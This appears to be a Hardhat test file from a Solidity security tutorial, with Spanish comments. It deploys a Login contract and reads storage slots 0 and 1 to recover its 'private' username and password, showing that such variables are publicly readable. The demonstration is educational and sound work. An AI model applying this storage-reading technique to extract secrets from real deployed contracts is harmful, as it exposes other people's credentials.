const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
  it("Should be able to read the private variables password and username", async function () {
    // Implementar el login contract
    const loginFactory = await ethers.getContractFactory("Login");

    // Para ahorrar espacio, convertiríamos la cadena en un array bytes32
    const usernameBytes = ethers.utils.formatBytes32String("test");
    const passwordBytes = ethers.utils.formatBytes32String("password");

    const loginContract = await loginFactory.deploy(
      usernameBytes,
      passwordBytes
    );
    await loginContract.deployed();

   // Obtenga el almacenamiento en la ranura de almacenamiento 0,1
    const slot0Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      0
    );
    const slot1Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      1
    );

 // Somos capaces de extraer los valores de las variables privadas
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
  });
});